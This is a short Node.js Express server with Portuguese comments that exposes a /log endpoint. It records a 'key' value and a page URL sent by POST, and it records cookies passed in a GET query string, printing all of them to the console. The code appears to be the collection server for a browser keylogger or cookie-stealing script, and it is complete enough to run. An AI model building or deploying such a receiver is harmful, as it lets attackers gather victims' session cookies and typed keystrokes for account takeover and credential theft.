const express = require("express");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// Rode o comando node server.js
app.use(express.json());

app.use(bodyParser.json()); // Analisa o corpo das requisições como JSON

// Usando o cookie-parser no Express
app.use(cookieParser());

app.post("/log", (req, res) => {
  try {
    const { key, url } = req.body;
    console.log("Key:", key);
    console.log("URL:", url);
    res.status(200).send("Dados recebidos com sucesso");
  } catch (error) {
    console.error("Erro ao processar dados:", error);
    res.status(400).send("Erro no processamento dos dados");
  }
});

app.get("/log", (req, res) => {
  const cookies = req.query; // Acessa os cookies enviados via query string
  const url = req.query.url; // Acessa a URL enviada via query string

  // Exibe os cookies e a URL no console do servidor
  console.log("Cookies recebidos:", cookies);
  console.log("URL da página:", url);

  // Responde com uma mensagem de sucesso
  res.status(200).send("Dados recebidos com sucesso");
});

app.listen(3000, () => console.log("Servidor rodando na porta 3000"));
